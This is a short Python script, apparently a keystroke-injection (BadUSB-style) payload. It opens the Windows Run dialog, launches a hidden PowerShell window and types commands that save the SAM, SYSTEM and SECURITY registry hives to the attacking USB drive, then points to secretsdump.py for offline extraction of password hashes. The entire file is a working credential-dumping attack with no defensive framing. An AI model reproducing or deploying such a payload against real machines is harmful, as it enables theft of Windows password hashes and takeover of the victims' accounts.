#!/usr/bin/env python3
import os, sys, time
from hid_type import win_r, type_string
from payload_utils import find_msd_drive_letter

def main():
    print("[*] Launching hash dump...")

    drive = find_msd_drive_letter(default="E:")
    outfile = f"{drive}\\hashes"
    type_string_delay = 0.03  # Fast but safe delay

    win_r(); time.sleep(0.5)
    type_string("powershell\n", delay=type_string_delay)
    time.sleep(1.0)

    cmds = rf"""
mkdir "{outfile}" -Force
reg save HKLM\\SAM "{outfile}\\sam.save"
reg save HKLM\\SYSTEM "{outfile}\\system.save"
reg save HKLM\\SECURITY "{outfile}\\security.save"
"Saved registry hives to {outfile}" | Out-File "{outfile}\\status.txt"
"""
    one_liner = ";".join([l.strip() for l in cmds.strip().splitlines()])
    type_string(f"powershell -nop -w hidden -c \"{one_liner}\"\n", delay=type_string_delay)

    print("[+] Hashdump script delivered. Offline extraction can follow with secretsdump.py.")

if __name__ == "__main__":
    main()
